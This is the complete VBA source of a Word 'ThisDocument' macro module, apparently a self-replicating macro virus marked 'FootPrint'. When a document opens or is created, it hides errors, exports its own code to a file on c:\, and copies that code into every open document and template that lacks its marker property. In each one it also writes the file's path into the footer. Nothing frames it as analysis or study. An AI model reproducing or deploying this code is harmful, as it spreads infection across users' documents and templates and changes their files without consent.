   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Option Explicit
   Private Sub Document_New()
   Document_Open
   End Sub
   Private Sub Document_Open()
   On Error Resume Next
   Dim al As String
   Dim adoc As Document
   Dim atpl As Template
   ThisDocument.VBProject.VBComponents("ThisDocument").Export "c:\footprint.$$$"
   Open "c:\footprint.$$$" For Input As #1
   Open "c:\footprint.$$1" For Output As #2
   Line Input #1, al
   Line Input #1, al
   Line Input #1, al
   Line Input #1, al
   While Not EOF(1)
       Line Input #1, al
       Print #2, al
   Wend
   Close 1
   Close 2
   For Each adoc In Documents
       If Not adoc.CustomDocumentProperties("FootPrint") Then
           adoc.Sections(1).Footers(wdHeaderFooterPrimary).Range.Text = adoc.FullName
           adoc.CustomDocumentProperties.Add Name:="FootPrint", LinkToContent:=False, Value:=True, Type:=msoPropertyTypeBoolean
           adoc.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "c:\footprint.$$1"
       End If
   Next
   For Each atpl In Templates
       If Not atpl.CustomDocumentProperties("FootPrint") Then
           atpl.CustomDocumentProperties.Add Name:="FootPrint", LinkToContent:=False, Value:=True, Type:=msoPropertyTypeBoolean
           atpl.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "c:\footprint.$$1"
       End If
   Next
   End Sub
